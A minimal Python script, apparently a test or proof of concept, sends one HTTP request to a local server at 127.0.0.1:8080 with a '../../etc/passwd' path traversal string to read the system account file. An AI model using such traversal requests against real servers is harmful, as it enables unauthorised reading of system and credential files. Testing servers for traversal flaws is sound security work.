#!/usr/bin/env python

from urllib import request

response = request.urlopen('http://127.0.0.1:8080/asdf/../../etc/passwd')
